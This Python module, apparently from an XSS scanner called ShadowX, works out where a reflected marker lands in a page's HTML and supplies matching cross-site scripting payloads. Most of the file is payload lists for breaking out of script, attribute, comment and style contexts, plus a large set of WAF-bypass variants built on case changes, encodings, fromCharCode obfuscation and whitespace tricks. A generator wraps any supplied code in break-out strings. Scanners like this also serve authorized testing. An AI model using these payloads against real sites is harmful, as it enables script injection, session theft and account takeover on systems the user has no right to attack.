"""
Context Analysis Engine for ShadowX
Analyzes HTML context to determine optimal XSS payloads
"""

import re
from bs4 import BeautifulSoup
from urllib.parse import unquote

class ContextEngine:
    def __init__(self):
        self.context_patterns = {
            'script_tag': [
                r'<script[^>]*>.*?{marker}.*?</script>',
                r'<script[^>]*>{marker}',
                r'{marker}.*?</script>'
            ],
            'script_attribute': [
                r'<[^>]+\s+on\w+\s*=\s*["\'][^"\']*{marker}[^"\']*["\']',
                r'<[^>]+\s+href\s*=\s*["\']javascript:[^"\']*{marker}[^"\']*["\']'
            ],
            'html_attribute': [
                r'<[^>]+\s+\w+\s*=\s*["\'][^"\']*{marker}[^"\']*["\']',
                r'<[^>]+\s+\w+\s*=\s*{marker}(?:\s|>)'
            ],
            'html_body': [
                r'<(?:div|span|p|td|th|li|h[1-6])[^>]*>[^<]*{marker}[^<]*</(?:div|span|p|td|th|li|h[1-6])>',
                r'>[^<]*{marker}[^<]*<'
            ],
            'html_comment': [
                r'<!--[^>]*{marker}[^>]*-->'
            ],
            'style_tag': [
                r'<style[^>]*>.*?{marker}.*?</style>'
            ],
            'style_attribute': [
                r'<[^>]+\s+style\s*=\s*["\'][^"\']*{marker}[^"\']*["\']'
            ]
        }
        
        self.context_payloads = {
            'script_tag': [
                '";alert("{{MARKER}}");var dummy="',
                '\';alert("{{MARKER}}");var dummy=\'',
                '</script><script>alert("{{MARKER}}")</script>',
                '/**/alert("{{MARKER}}")/**/',
                'prompt("{{MARKER}}")',
                'confirm("{{MARKER}}")'
            ],
            'script_attribute': [
                'alert("{{MARKER}}")',
                '"onmouseover="alert("{{MARKER}}")"',
                '\'"onmouseover="alert("{{MARKER}}")"',
                'javascript:alert("{{MARKER}}")',
                '" onclick="alert("{{MARKER}}")"',
                '\' onclick=\'alert("{{MARKER}}");\''
            ],
            'html_attribute': [
                '"><script>alert("{{MARKER}}")</script>',
                '\'""><script>alert("{{MARKER}}")</script>',
                '" onmouseover="alert("{{MARKER}}")"',
                '\' onmouseover=\'alert("{{MARKER}}")\' dummy=\'',
                '"><img src=x onerror=alert("{{MARKER}}")>',
                '\'""><img src=x onerror=alert("{{MARKER}}")>'
            ],
            'html_body': [
                '<script>alert("{{MARKER}}")</script>',
                '<img src=x onerror=alert("{{MARKER}}")>',
                '<svg onload=alert("{{MARKER}}")>',
                '<body onload=alert("{{MARKER}}")>',
                '<iframe src=javascript:alert("{{MARKER}}")>',
                '<object data=javascript:alert("{{MARKER}}")>',
                '<embed src=javascript:alert("{{MARKER}}")>',
                '<marquee onstart=alert("{{MARKER}}")>',
                '<details ontoggle=alert("{{MARKER}}")>',
                '<audio src=x onerror=alert("{{MARKER}}")>'
            ],
            'html_comment': [
                '--><script>alert("{{MARKER}}")</script><!--',
                '--!><script>alert("{{MARKER}}")</script><!--'
            ],
            'style_tag': [
                '</style><script>alert("{{MARKER}}")</script><style>',
                'expression(alert("{{MARKER}}"))',
                'url(javascript:alert("{{MARKER}}"))'
            ],
            'style_attribute': [
                '";alert("{{MARKER}}");"',
                'expression(alert("{{MARKER}}"))',
                'url(javascript:alert("{{MARKER}}"))',
                '"><script>alert("{{MARKER}}")</script><div style="'
            ]
        }
        
        # WAF bypass payloads
        self.waf_bypass_payloads = [
            # Case variations
            '<ScRiPt>alert("{{MARKER}}")</ScRiPt>',
            '<sCrIpT>alert("{{MARKER}}")</sCrIpT>',
            
            # Encoding variations
            '&lt;script&gt;alert("{{MARKER}}")&lt;/script&gt;',
            '%3Cscript%3Ealert("{{MARKER}}")%3C/script%3E',
            '&#60;script&#62;alert("{{MARKER}}")&#60;/script&#62;',
            
            # Alternative tags
            '<img src=x onerror=alert("{{MARKER}}")>',
            '<svg onload=alert("{{MARKER}}")>',
            '<iframe src=javascript:alert("{{MARKER}}")>',
            '<object data=javascript:alert("{{MARKER}}")>',
            '<embed src=javascript:alert("{{MARKER}}")>',
            '<video poster=javascript:alert("{{MARKER}}")>',
            '<audio src=x onerror=alert("{{MARKER}}")>',
            
            # Event handlers
            '<div onmouseover=alert("{{MARKER}}")>',
            '<span onclick=alert("{{MARKER}}")>',
            '<p onload=alert("{{MARKER}}")>',
            '<body onpageshow=alert("{{MARKER}}")>',
            '<form oninput=alert("{{MARKER}}")>',
            '<select onfocus=alert("{{MARKER}}")>',
            '<textarea onblur=alert("{{MARKER}}")>',
            '<input onkeypress=alert("{{MARKER}}")>',
            
            # JavaScript protocol
            'javascript:alert("{{MARKER}}")',
            'JavaScript:alert("{{MARKER}}")',
            'JAVASCRIPT:alert("{{MARKER}}")',
            'javas\tcript:alert("{{MARKER}}")',
            'javas\ncript:alert("{{MARKER}}")',
            'javas\rcript:alert("{{MARKER}}")',
            
            # Unicode and encoding
            '<script>\u0061lert("{{MARKER}}")</script>',
            '<script>\\u0061lert("{{MARKER}}")</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,{{MARKER}},34,41))</script>',
            
            # Template literals
            '<script>`alert("{{MARKER}}")`</script>',
            '<script>alert`{{MARKER}}`</script>',
            
            # Expression alternatives
            '<img src=x onerror=eval(alert("{{MARKER}}"))>',
            '<img src=x onerror=Function("alert(\\"{{MARKER}}\\\")")()>',
            '<img src=x onerror=setTimeout("alert(\\"{{MARKER}}\\")",1)>',
            '<img src=x onerror=setInterval("alert(\\"{{MARKER}}\\")",1)>',
            
            # CSS injection
            '<style>@import "javascript:alert(\\"{{MARKER}}\\\")";</style>',
            '<style>body{background:url("javascript:alert(\\"{{MARKER}}\\\")")}</style>',
            '<link rel=stylesheet href="javascript:alert(\\"{{MARKER}}\\\")">',
            
            # SVG payloads
            '<svg><script>alert("{{MARKER}}")</script></svg>',
            '<svg onload=alert("{{MARKER}}")></svg>',
            '<svg><animate onbegin=alert("{{MARKER}}")></svg>',
            '<svg><foreignObject><script>alert("{{MARKER}}")</script></foreignObject></svg>',
            
            # Form-related
            '<form><button formaction=javascript:alert("{{MARKER}}")>',
            '<form><input type=submit formaction=javascript:alert("{{MARKER}}")>',
            '<isindex action=javascript:alert("{{MARKER}}")>',
            
            # Meta refresh
            '<meta http-equiv=refresh content="0;url=javascript:alert(\\"{{MARKER}}\\")">',
            
            # Data URI
            '<iframe src="data:text/html,<script>alert(\\"{{MARKER}}\\")</script>">',
            '<object data="data:text/html,<script>alert(\\"{{MARKER}}\\")</script>">',
            
            # Comments and CDATA
            '<!--<script>alert("{{MARKER}}")</script>-->',
            '<![CDATA[<script>alert("{{MARKER}}")</script>]]>',
            
            # Alternative quotes
            "<script>alert('{{MARKER}}')</script>",
            '<script>alert(`{{MARKER}}`)</script>',
            '<img src=x onerror=alert(`{{MARKER}}`)>',
            
            # Whitespace variations
            '<script >alert("{{MARKER}}")</script>',
            '<script\t>alert("{{MARKER}}")</script>',
            '<script\n>alert("{{MARKER}}")</script>',
            '<script\r>alert("{{MARKER}}")</script>',
            '< script>alert("{{MARKER}}")</script>',
            
            # Null bytes (for some contexts)
            '<script>alert("{{MARKER}}\x00")</script>',
            '<img src=x onerror=alert("{{MARKER}}\x00")>',
        ]
        
    def analyze_context(self, html_content, marker):
        """Analyze the HTML context where the marker appears"""
        if not marker or marker not in html_content:
            return {
                'context_type': 'unknown',
                'description': 'Marker not found in response',
                'recommendations': []
            }
            
        # Decode HTML entities for better analysis
        html_content = unquote(html_content)
        
        # Find all occurrences of the marker
        marker_positions = []
        start = 0
        while True:
            pos = html_content.find(marker, start)
            if pos == -1:
                break
            marker_positions.append(pos)
            start = pos + 1
            
        contexts = []
        
        for pos in marker_positions:
            context = self._analyze_single_context(html_content, marker, pos)
            contexts.append(context)
            
        # Return the most specific context found
        if contexts:
            # Prioritize script contexts as they're most dangerous
            script_contexts = [c for c in contexts if 'script' in c['context_type']]
            if script_contexts:
                return script_contexts[0]
            return contexts[0]
            
        return {
            'context_type': 'unknown',
            'description': 'Could not determine injection context',
            'recommendations': []
        }
        
    def _analyze_single_context(self, html_content, marker, position):
        """Analyze context for a single marker occurrence"""
        # Get surrounding text (500 chars before and after)
        start = max(0, position - 500)
        end = min(len(html_content), position + len(marker) + 500)
        surrounding = html_content[start:end]
        
        # Check each context type
        for context_type, patterns in self.context_patterns.items():
            for pattern in patterns:
                regex_pattern = pattern.replace('{marker}', re.escape(marker))
                if re.search(regex_pattern, surrounding, re.IGNORECASE | re.DOTALL):
                    return {
                        'context_type': context_type,
                        'description': self._get_context_description(context_type),
                        'recommendations': self._get_context_recommendations(context_type),
                        'surrounding_text': surrounding[max(0, position - start - 100):position - start + len(marker) + 100]
                    }
                    
        # Fallback analysis using BeautifulSoup
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            marker_text = soup.find(text=re.compile(re.escape(marker)))
            
            if marker_text:
                parent = marker_text.parent
                if parent:
                    tag_name = parent.name.lower() if parent.name else 'unknown'
                    
                    if tag_name == 'script':
                        return {
                            'context_type': 'script_tag',
                            'description': 'Inside script tag',
                            'recommendations': self._get_context_recommendations('script_tag'),
                            'surrounding_text': str(parent)[:200]
                        }
                    elif tag_name == 'style':
                        return {
                            'context_type': 'style_tag',
                            'description': 'Inside style tag',
                            'recommendations': self._get_context_recommendations('style_tag'),
                            'surrounding_text': str(parent)[:200]
                        }
                    else:
                        return {
                            'context_type': 'html_body',
                            'description': f'Inside {tag_name} tag',
                            'recommendations': self._get_context_recommendations('html_body'),
                            'surrounding_text': str(parent)[:200]
                        }
                        
        except Exception:
            pass
            
        return {
            'context_type': 'html_body',
            'description': 'Likely in HTML body context',
            'recommendations': self._get_context_recommendations('html_body'),
            'surrounding_text': surrounding[max(0, position - start - 50):position - start + len(marker) + 50]
        }
        
    def _get_context_description(self, context_type):
        """Get human-readable description for context type"""
        descriptions = {
            'script_tag': 'Injection point is inside a script tag',
            'script_attribute': 'Injection point is inside a JavaScript event handler',
            'html_attribute': 'Injection point is inside an HTML attribute value',
            'html_body': 'Injection point is in the HTML body content',
            'html_comment': 'Injection point is inside an HTML comment',
            'style_tag': 'Injection point is inside a style tag',
            'style_attribute': 'Injection point is inside a style attribute'
        }
        return descriptions.get(context_type, 'Unknown injection context')
        
    def _get_context_recommendations(self, context_type):
        """Get payload recommendations for context type"""
        recommendations = {
            'script_tag': [
                'Break out of current JavaScript context with quotes and semicolons',
                'Use comment syntax to neutralize following code',
                'Try function calls like alert(), prompt(), confirm()',
                'Consider using template literals with backticks'
            ],
            'script_attribute': [
                'Ensure proper JavaScript syntax within event handler',
                'Use simple function calls like alert()',
                'Consider breaking out to inject new attributes',
                'Try JavaScript protocol (javascript:) if in href'
            ],
            'html_attribute': [
                'Break out of attribute with quotes',
                'Inject new attributes like onmouseover, onclick',
                'Close current tag and inject new script tag',
                'Use HTML entities if needed for encoding'
            ],
            'html_body': [
                'Inject script tags directly',
                'Use img tags with onerror events',
                'Try SVG tags with onload events',
                'Consider iframe with JavaScript source',
                'Use various HTML5 tags with event handlers'
            ],
            'html_comment': [
                'Break out of comment with -->',
                'Inject script tag after comment closure',
                'Try malformed comment syntax'
            ],
            'style_tag': [
                'Break out of style tag with </style>',
                'Use CSS expressions (older browsers)',
                'Try @import with JavaScript URLs',
                'Use url() with JavaScript protocol'
            ],
            'style_attribute': [
                'Break out of style attribute with quotes',
                'Use CSS expressions',
                'Try JavaScript URLs in CSS',
                'Close attribute and inject new ones'
            ]
        }
        return recommendations.get(context_type, ['Try basic XSS payloads'])
        
    def get_context_specific_payloads(self, context_type):
        """Get payloads specific to the detected context"""
        base_payloads = self.context_payloads.get(context_type, self.context_payloads['html_body'])
        
        # Add WAF bypass payloads for additional coverage
        all_payloads = base_payloads.copy()
        all_payloads.extend(self.waf_bypass_payloads[:10])  # Add first 10 bypass payloads
        
        return all_payloads
        
    def generate_custom_payload(self, context_type, original_payload):
        """Generate a custom payload based on context analysis"""
        if context_type == 'script_tag':
            # Try to break out of script context
            variations = [
                f'";{original_payload};var dummy="',
                f'\';{original_payload};var dummy=\'',
                f'/**/;{original_payload}/**/;',
                f'</script><script>{original_payload}</script><script>var dummy='
            ]
        elif context_type == 'html_attribute':
            # Try to break out of attribute
            variations = [
                f'"><script>{original_payload}</script><div dummy="',
                f'\'""><script>{original_payload}</script><div dummy="',
                f'" onmouseover="{original_payload}" dummy="',
                f'\' onmouseover=\'{original_payload}\' dummy=\''
            ]
        elif context_type == 'html_body':
            # Direct injection
            variations = [
                f'<script>{original_payload}</script>',
                f'<img src=x onerror="{original_payload}">',
                f'<svg onload="{original_payload}">',
                f'<iframe src="javascript:{original_payload}">'
            ]
        else:
            # Default variations
            variations = [
                f'<script>{original_payload}</script>',
                f'"><script>{original_payload}</script>',
                f'\'""><script>{original_payload}</script>',
                f'<img src=x onerror="{original_payload}">'
            ]
            
        return variations
